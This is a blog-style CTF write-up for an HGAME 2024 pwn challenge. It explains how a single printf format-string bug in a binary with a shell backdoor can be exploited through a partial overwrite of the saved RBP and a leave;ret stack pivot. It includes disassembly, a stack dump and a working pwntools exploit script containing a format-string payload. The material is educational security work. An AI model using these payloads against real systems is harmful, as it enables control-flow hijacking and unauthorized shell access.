---
layout: post
title: "A single fmtstr away from shell"
date: 2024-02-04T17:00:25+08:00
lang: en
description: >-
    In this article we describe a special kind of Pwn challenge in which
    only a single fmtstr is needed to get shell without overwriting returning
    address.
tags: topic:ctf pwn c/c++
---

## 0. Background

If you are a security analyst, you'll be delighted to see this kind of construction in code you're auditing:

```c
char *fmt = build_format();
printf(fmt, arg1, arg2);
free_format(fmt);
```

If `fmt` in the above code may be controlled by malicious user to produce a mismatch with variable parameters provided to `printf()` (in this case, for example, an format expecting 3 or more parameters), this would be a major security loophole that may corrupt the stack. If no other security measures are taken, a control flow hijacking is possible.

## 1. The challenge

A binary executable is served on a remote server for exploitation. The executable itself is handed out to competitors. Here, we list out the disassembly of important functions and preliminary results provided by automated tools.

```text
mantlebao@LAPTOP-RONG-BAO:[...]$ checksec --file ./vuln
[*] '[...]/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
mantlebao@LAPTOP-RONG-BAO:[...]$
```

```asm
.text:0000000000401110 ; =============== S U B R O U T I N E =======================================
.text:0000000000401110
.text:0000000000401110 ; Attributes: noreturn fuzzy-sp
.text:0000000000401110
.text:0000000000401110 ; void __fastcall __noreturn start(__int64, __int64, void (*)(void))
.text:0000000000401110                 public _start
.text:0000000000401110 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:0000000000401110 ; __unwind {
.text:0000000000401110                 endbr64
.text:0000000000401114                 xor     ebp, ebp
.text:0000000000401116                 mov     r9, rdx         ; rtld_fini
.text:0000000000401119                 pop     rsi             ; argc
.text:000000000040111A                 mov     rdx, rsp        ; ubp_av
.text:000000000040111D                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:0000000000401121                 push    rax
.text:0000000000401122                 push    rsp             ; stack_end
.text:0000000000401123                 xor     r8d, r8d        ; fini
.text:0000000000401126                 xor     ecx, ecx        ; init
.text:0000000000401128                 mov     rdi, offset main ; main
.text:000000000040112F                 call    cs:__libc_start_main_ptr
.text:0000000000401135                 hlt
.text:0000000000401135 ; } // starts at 401110
.text:0000000000401135 _start          endp
.text:0000000000401135
.text:0000000000401135 ; ---------------------------------------------------------------------------
...
.text:000000000040123D ; =============== S U B R O U T I N E =======================================
.text:000000000040123D
.text:000000000040123D ; Attributes: bp-based frame
.text:000000000040123D
.text:000000000040123D ; void __fastcall sys()
.text:000000000040123D                 public sys
.text:000000000040123D sys             proc near               ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o
.text:000000000040123D ; __unwind {
.text:000000000040123D                 endbr64
.text:0000000000401241                 push    rbp
.text:0000000000401242                 mov     rbp, rsp
.text:0000000000401245                 lea     rdi, command    ; "/bin/sh"
.text:000000000040124C                 call    _system
.text:0000000000401251                 nop
.text:0000000000401252                 pop     rbp
.text:0000000000401253                 retn
.text:0000000000401253 ; } // starts at 40123D
.text:0000000000401253 sys             endp
...
.text:0000000000401254 ; =============== S U B R O U T I N E =======================================
.text:0000000000401254
.text:0000000000401254 ; Attributes: bp-based frame
.text:0000000000401254
.text:0000000000401254 ; void __fastcall vuln()
.text:0000000000401254                 public vuln
.text:0000000000401254 vuln            proc near               ; CODE XREF: main+37↓p
.text:0000000000401254
.text:0000000000401254 buf             = byte ptr -80h
.text:0000000000401254 s               = byte ptr -60h
.text:0000000000401254 var_8           = qword ptr -8
.text:0000000000401254
.text:0000000000401254 ; __unwind {
.text:0000000000401254                 endbr64
.text:0000000000401258                 push    rbp
.text:0000000000401259                 mov     rbp, rsp
.text:000000000040125C                 add     rsp, 0FFFFFFFFFFFFFF80h
.text:0000000000401260                 mov     rax, fs:28h
.text:0000000000401269                 mov     [rbp+var_8], rax
.text:000000000040126D                 xor     eax, eax
.text:000000000040126F                 mov     rax, 72747320656B616Dh
.text:0000000000401279                 mov     rdx, 646E612073676E69h
.text:0000000000401283                 mov     qword ptr [rbp+buf], rax
.text:0000000000401287                 mov     qword ptr [rbp+buf+8], rdx
.text:000000000040128B                 mov     rax, 6C65687374656720h
.text:0000000000401295                 mov     qword ptr [rbp+buf+10h], rax
.text:0000000000401299                 mov     word ptr [rbp+buf+18h], 0A6Ch
.text:000000000040129F                 mov     [rbp+buf+1Ah], 0
.text:00000000004012A3                 lea     rax, [rbp+buf]
.text:00000000004012A7                 mov     edx, 1Bh        ; n
.text:00000000004012AC                 mov     rsi, rax        ; buf
.text:00000000004012AF                 mov     edi, 0          ; fd
.text:00000000004012B4                 mov     eax, 0
.text:00000000004012B9                 call    _write
.text:00000000004012BE                 lea     rax, [rbp+s]
.text:00000000004012C2                 mov     edx, 50h ; 'P'  ; nbytes
.text:00000000004012C7                 mov     rsi, rax        ; buf
.text:00000000004012CA                 mov     edi, 0          ; fd
.text:00000000004012CF                 mov     eax, 0
.text:00000000004012D4                 call    _read
.text:00000000004012D9                 lea     rax, [rbp+s]
.text:00000000004012DD                 mov     esi, 70h ; 'p'  ; c
.text:00000000004012E2                 mov     rdi, rax        ; s
.text:00000000004012E5                 call    _strchr
.text:00000000004012EA                 test    rax, rax
.text:00000000004012ED                 jnz     short loc_401316
.text:00000000004012EF                 lea     rax, [rbp+s]
.text:00000000004012F3                 mov     esi, 73h ; 's'  ; c
.text:00000000004012F8                 mov     rdi, rax        ; s
.text:00000000004012FB                 call    _strchr
.text:0000000000401300                 test    rax, rax
.text:0000000000401303                 jnz     short loc_401316
.text:0000000000401305                 lea     rax, [rbp+s]
.text:0000000000401309                 mov     rdi, rax        ; format
.text:000000000040130C                 mov     eax, 0
.text:0000000000401311                 call    _printf
.text:0000000000401316
.text:0000000000401316 loc_401316:                             ; CODE XREF: vuln+99↑j
.text:0000000000401316                                         ; vuln+AF↑j
.text:0000000000401316                 nop
.text:0000000000401317                 mov     rax, [rbp+var_8]
.text:000000000040131B                 xor     rax, fs:28h
.text:0000000000401324                 jz      short locret_40132B
.text:0000000000401326                 call    ___stack_chk_fail
.text:000000000040132B ; ---------------------------------------------------------------------------
.text:000000000040132B
.text:000000000040132B locret_40132B:                          ; CODE XREF: vuln+D0↑j
.text:000000000040132B                 leave
.text:000000000040132C                 retn
.text:000000000040132C ; } // starts at 401254
.text:000000000040132C vuln            endp
...
.text:000000000040132D ; =============== S U B R O U T I N E =======================================
.text:000000000040132D
.text:000000000040132D ; Attributes: bp-based frame
.text:000000000040132D
.text:000000000040132D ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:000000000040132D                 public main
.text:000000000040132D main            proc near               ; DATA XREF: _start+18↑o
.text:000000000040132D
.text:000000000040132D format          = qword ptr -8
.text:000000000040132D
.text:000000000040132D ; __unwind {
.text:000000000040132D                 endbr64
.text:0000000000401331                 push    rbp
.text:0000000000401332                 mov     rbp, rsp
.text:0000000000401335                 sub     rsp, 10h
.text:0000000000401339                 mov     eax, 0
.text:000000000040133E                 call    init
.text:0000000000401343                 lea     rax, aTheShitIsEzfmt ; "the shit is ezfmt, M3?\n"
.text:000000000040134A                 mov     [rbp+format], rax
.text:000000000040134E                 mov     rax, [rbp+format]
.text:0000000000401352                 mov     rdi, rax        ; format
.text:0000000000401355                 mov     eax, 0
.text:000000000040135A                 call    _printf
.text:000000000040135F                 mov     eax, 0
.text:0000000000401364                 call    vuln
.text:0000000000401369                 mov     eax, 0
.text:000000000040136E                 leave
.text:000000000040136F                 retn
.text:000000000040136F ; } // starts at 40132D
.text:000000000040136F main            endp
```

```c
void __fastcall sys()
{
  system("/bin/sh");
}

void __fastcall vuln()
{
  char buf[32]; // [rsp+0h] [rbp-80h] BYREF
  char s[88]; // [rsp+20h] [rbp-60h] BYREF
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  strcpy(buf, "make strings and getshell\n");
  write(0, buf, 27uLL);
  read(0, s, 80uLL);
  if ( !strchr(s, 'p') && !strchr(s, 's') )
    printf(s);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  printf("the shit is ezfmt, M3?\n");
  vuln();
  return 0;
}
```

## 2. Analysis

We can see a backdoor function in the given binary, thus hijacking the control flow to it will give us a nice shell. Also, PIE is not enabled, which means the backdoor is always at address `0x40123D`.

In function `vuln`, there is obviously a fmtstr vulnerability waiting for us. No other vulnerabilities can be spotted so far.

As Pwn-noobs, we may exploit a fmtstr vulnerability with known backdoor address in these ways:

* Overwriting return address with backdoor address. To do this, we need to first leak some address on stack with a first `printf` call, use it to calculate the location of return address, then overwrite it with a second `printf` call. However, we *don't* have a second chance to `printf`.
* Hijacking GOT. We have only partial RELRO, so overwriting some imported function with backdoor address will hijack subsequent calls to the backdoor. However, here we have *no* other function calls after `printf`.
* Overwriting `_fini` finalizer with our backdoor. Then, when the program exits, it will run our backdoor function instead. However, the `_start` sequence *doesn't* use `_fini` by passing a `NULL` to `__libc_start_main`, leaving us with no chance to overwrite it.

You can see that none of these will work in this challenge.

Let's take a look at the stack layout just before `call _printf`. This stack snapshot is taken from one run where `b"aaaabaaacaaadaa\n"` is provided as user input.

```text
00007FFCEA790B08  0000000000401300  vuln+AC
00007FFCEA790B10  72747320656B616D  <- RSP
00007FFCEA790B18  646E612073676E69  
00007FFCEA790B20  6C65687374656720  
00007FFCEA790B28  00007F2604000A6C  
00007FFCEA790B30  6161616261616161  ; b"aaaabaaa"
00007FFCEA790B38  0A61616461616163  ; b"caaadaa\n"
00007FFCEA790B40  00007F2604D8F600  libc.so.6:_IO_file_jumps
00007FFCEA790B48  00007F2604C025AD  libc.so.6:_IO_file_setbuf+
00007FFCEA790B50  00007F2604D93780  libc.so.6:_IO_2_1_stdout_
00007FFCEA790B58  00007F2604BF957F  libc.so.6:_IO_setbuffer+BF
00007FFCEA790B60  00000000000006F0  
00007FFCEA790B68  0000000000000000  
00007FFCEA790B70  00007FFCEA790B90  [stack]
00007FFCEA790B78  00007FFCEA790CC8  [stack]
00007FFCEA790B80  0000000000000000  
00007FFCEA790B88  4735D79EE50A4500  
00007FFCEA790B90  00007FFCEA790BB0  [stack]  <- RBP
00007FFCEA790B98  0000000000401369  main+3C
00007FFCEA790BA0  0000000000001000  
00007FFCEA790BA8  000000000040200C  .rodata:aTheShitIsEzfmt
```

You can see that the canary is at `0x00007FFCEA790B88`, but that is not relevant. Although most of the data between `0x00007FFCEA790B40` and RBP are all junk, they may contain shining diamond. At `0x00007FFCEA790B70`, the content is a `uint64_t` valued `0x00007FFCEA790B90`, the same as RBP! Can we change the control flow of the program by altering the value RBP points to?

After returning from `_printf`, the program continues to this sequence of instruction:

```asm
    nop
    mov rax, [rbp+var_8]
    xor rax, fs:28h
    jz short L_RET
    call ___stack_chk_fail
L_RET:
    leave
    retn
    mov eax, 0
    leave
    retn
```

The first `mov; xor; jz; call` sequence checks the canary and aborts the program if any discrepancy is found. The important part is the sequence `leave; ret; leave; ret`.

As per [Intel's manual](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html) and [Felix Cloutier's website](https://www.felixcloutier.com/x86/leave), a `leave` instruction on x64 platform is exactly what describes below:

1. `RSP <- RBP`
2. `RBP <- Pop()`

It is equivalent to first setting RSP to `RBP + 8`, and then setting RBP to `[RBP]`.

Utilizing this knowledge, if we set `[RBP]` to some address `addr`, then after running `leave; ret; leave;`, RSP will be `addr + 8`, and RBP will be `[addr]`. A final `ret;` will take the control flow to `[addr + 8]`, and if we can control that address, we will be able to hijack the program.

We can read up to 80 bytes into the stack, so managing to craft a backdoor address `0x40123D` on stack is not difficult. The problem is, how to get a valid `addr` whose next `uint64_t` is exactly our crafted address. In the stack snapshot above, our input string is placed starting from `0x00007FFCEA790B30`. Luckily, before we start to ruin the world, `[RBP]` already contains a value `0x00007FFCEA790BB0`, and it only differs from our controllable byte array address by 1 byte, namely `0x30` vs `0xB0`. In the easy way, we can just resort to chance to do the job, by fixing this former address and run exploit multiple times until we get shell and solve the challenge.

## 3. Solution

```python
#!/usr/bin/env python3
# sol.py

from pwn import *

vuln = ELF("./ezfmt/attachment/attachment/vuln")
context.binary = vuln

with remote("remote.server.local", 31709) as r:
    payload_1 = b"%128c%18$hhn".ljust(48, b"\x00") + p64(0) + p64(0x401245)
    info(hexdump(payload_1))
    r.sendafter(b"make strings and getshell\n", payload_1)
    r.interactive()
```

This script writes `0x80` (128) to the least significant byte of `[RBP]`. In fact, here `0x80` can be any one-byte multiple of 16 as you like it. Afterwards, pads off 48 bytes, crafting a new final RBP value (`0` here; it can be any address as we do not care about the environment after getting shell anyway) and return address (`0x401245`). Run `sol.py` multiple times until getting shell.

Why we don't choose to return to `0x40123D`? Because the initial stack allocation sequence `push rbp; mov rbp, rsp;` would force us to care so much about crafting valid RSP and RBP values. By returning directly to `0x401245` (`lea rdi, command`), we can ensure a smooth shell acquisition.

## 4. Conclusion

The author encountered this challenge for the first time in Week 1 of HGAME 2024, presented by Vidar-Team. Many previous works (such as <https://chuanpuyun.com/article/5860.html> and <https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#0x071-xman-2019-format-fmtstr>) describe fmtstr vulnerabilities that requires at least 2 calls to `printf`. The result described here may serve as a good starting point for Pwn-beginners to think about exploiting vulnerabilities in restricted and stringent environments.
